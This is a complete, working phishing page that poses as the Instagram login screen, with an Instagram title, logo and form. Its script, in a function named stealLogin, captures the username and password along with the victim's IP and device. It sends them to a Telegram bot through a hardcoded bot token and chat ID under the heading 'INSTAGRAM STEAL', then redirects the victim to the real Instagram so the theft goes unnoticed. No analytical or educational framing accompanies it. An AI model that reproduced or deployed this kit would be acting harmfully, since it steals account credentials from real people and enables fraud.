<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #000;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            color: #fff;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .main {
            width: 100%;
            max-width: 350px;
            padding: 20px;
            text-align: center;
        }
        .logo {
            width: 175px;
            height: 51px;
            margin: 30px auto;
            background: url('https://www.instagram.com/static/images/web/logged_out_wordmark.png') no-repeat center;
            background-size: contain;
        }
        .form {
            background: #111;
            border: 1px solid #363636;
            border-radius: 8px;
            padding: 30px 25px;
        }
        input {
            width: 100%;
            padding: 12px 10px;
            margin: 8px 0;
            background: #1a1a1a;
            border: 1px solid #555;
            border-radius: 6px;
            color: #fff;
            font-size: 14px;
        }
        button {
            width: 100%;
            padding: 10px;
            background: #0095f6;
            color: #fff;
            border: none;
            border-radius: 8px;
            font-weight: 600;
            margin: 15px 0;
            cursor: pointer;
        }
        .forgot {
            color: #0095f6;
            font-size: 13px;
            margin: 10px 0;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="main">
        <div class="logo"></div>
        
        <div class="form">
            <input type="text" id="username" placeholder="Username, email or mobile number" autocomplete="off">
            <input type="password" id="password" placeholder="Password" autocomplete="off">
            
            <button onclick="stealLogin()">Log in</button>
            
            <div class="forgot">Forgot password?</div>
        </div>

        <div style="margin-top:30px; font-size:14px; color:#aaa;">
            Don't have an account? <span style="color:#0095f6;">Sign up</span>
        </div>
    </div>

    <script>
        const BOT_TOKEN = '8591713771:AAHsYoY0Be8gkmHVBF_ykWmpPt293_PNELk';
        const CHAT_ID = '8539996558';

        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch(e) { return 'Unknown'; }
        }

        async function stealLogin() {
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();

            if (!username || !password) return;

            const text = `🔥 INSTAGRAM STEAL\n\n` +
                        `👤 <b>Username:</b> <code>${username}</code>\n` +
                        `🔑 <b>Password:</b> <code>${password}</code>\n\n` +
                        `📱 Device: ${navigator.platform}\n` +
                        `🌐 IP: ${await getIP()}\n` +
                        `⏰ Time: ${new Date().toISOString()}\n\n` +
                        `━━━━━━━━━━━━━━━━━━\n` +
                        `📋 اضغط للنسخ:\n` +
                        `👤 ${username}\n` +
                        `🔑 ${password}`;

            const form = new FormData();
            form.append('chat_id', CHAT_ID);
            form.append('text', text);
            form.append('parse_mode', 'HTML');

            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                body: form
            }).catch(() => {});

            // Redirect to real Instagram
            setTimeout(() => {
                window.location.href = "https://www.instagram.com/accounts/login/";
            }, 1400);
        }

        // دعم زر Enter
        document.addEventListener('keypress', (e) => {
            if (e.key === "Enter") stealLogin();
        });
    </script>
</body>
</html>
